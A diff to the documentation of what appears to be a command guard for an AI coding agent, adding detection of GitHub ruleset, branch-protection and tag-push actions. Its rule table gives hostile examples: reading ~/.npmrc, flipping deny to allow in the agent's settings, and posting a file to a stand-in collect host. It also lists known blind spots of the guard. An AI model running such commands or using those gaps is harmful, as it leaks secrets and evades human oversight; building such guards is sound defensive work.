@@ -32,6 +32,7 @@ guarded file stays readable by that user. The OS account is the real boundary.
 - Commands built at run time (`$(...)`, `read`, `printf -v`, `eval "$x"`) are not followed.
   A script run by path is read one level deep.
 - An HTTP client that sends a write method to a URL whose host, or whose `api.github.com` path, is known only at run time reads as a merge.
+- A GitHub REST write (any method but GET or HEAD) to a ruleset route (`repos/<o>/<r>/rulesets`, `repositories/<id>/rulesets`, `orgs/<o>/rulesets`, `enterprises/<e>/rulesets`) or to `branches/<b>/protection` on any branch, through gh api, curl, wget or httpie, reads as `authority-config`. A gh endpoint known only at run time (TP-2707 d), a filled `{owner}/{repo}` slot whose fill reroutes the path (TP-2755 b) and GraphQL ruleset mutations (TP-2831) are not read here.
 - A curl, wget or httpie config file is checked only within one command line: an rc file planted by an earlier Bash call (`echo method=PUT > ~/.wgetrc`, then `wget <merge URL>` in the next call) is not seen (TP-2861 tracks the path-layer guard). A download that names its file from the URL (`curl -O`/`-J`, a bare `wget "$U"`) is not read as an rc write either. An archive extract (tar, bsdtar or cpio extract, unzip, pax -r, 7z x/e, ar x, jar x) counts as an rc write in any directory, because its member paths may be absolute. Other unpackers and interpreters are not read.
 - A Bash command the tokenizer cannot parse passes, unless its text names a guarded
   path, a distinctive credential file name, or `gh pr merge`, `/merge`, `publish`, `deploy`,
@@ -175,9 +176,9 @@ Every id has a test fixture.
 | Family | Action | Spellings | Example |
 |---|---|---|---|
 | secret | `secret-read` | `read.secret`, `read.secret-symlink`, `grep.secret`, and 22 `bash.secret.*` ids: `cat`, `head-tail-less`, `grep`, `cp-mv`, `encode`, `redirect-in`, `here-string`, `subshell`, `absolute`, `home-relative`, `symlink`, `link-then-read`, `var-indirection`, `quoting`, `glob`, `sh-c`, `xargs`, `inline-interpreter`, `heredoc-shell`, `script-by-path`, `keychain`, `mention` | `base64 < ~/.npmrc` |
-| config | `authority-config` | `write.config`, and `bash.config.*`: `redirect-out`, `tee`, `cp-mv-ln`, `in-place`, `remove`, `interpreter`, `git-hooks`, `git-config-hookspath`, `claude-cli`, `mention` | `sed -i '' 's/deny/allow/' ~/.claude/settings.json` |
+| config | `authority-config` | `write.config`, and `bash.config.*`: `redirect-out`, `tee`, `cp-mv-ln`, `in-place`, `remove`, `interpreter`, `git-hooks`, `git-config-hookspath`, `claude-cli`, `gh-api-ruleset`, `curl-api-ruleset`, `mention` | `sed -i '' 's/deny/allow/' ~/.claude/settings.json` |
 | merge | `merge` | `bash.merge.*`: `gh-pr-merge`, `gh-api-merge`, `gh-api-merges`, `gh-api-graphql`, `curl-api`, `git-merge-protected`, `git-push-protected`, `git-push-implicit`, `git-push-all` | `gh pr merge 12 --squash` |
-| release | `release` | `bash.release.*`: `npm-publish`, `pnpm-publish`, `yarn-bun-publish`, `changeset-publish`, `npm-registry-mutation`, `gh-release`, `gh-workflow-run`, `wrangler-deploy`, `version-packages-merge` | `pnpm exec changeset publish` |
+| release | `release` | `bash.release.*`: `npm-publish`, `pnpm-publish`, `yarn-bun-publish`, `changeset-publish`, `npm-registry-mutation`, `gh-release`, `gh-workflow-run`, `wrangler-deploy`, `version-packages-merge`, `git-push-tag` (`--tags`, `--follow-tags`, `-c push.followTags`, `refs/tags/…`, `tags/…`, `v<digit>…`, `[@scope/]pkg@<digit>…` or `tag <name>`) | `pnpm exec changeset publish` |
 | egress | `private-egress` | `bash.egress.*`: `gh-gist`, `curl-upload`, `wget-upload`, `httpie`, `raw-socket`, `remote-copy`, `cloud-copy`, `git-push-url` | `curl -d @report.json https://collect.example.com/in` |
 
 The guarded paths are `GUARDED_PATHS` (owner decision D4). The egress allowlist is GitHub,
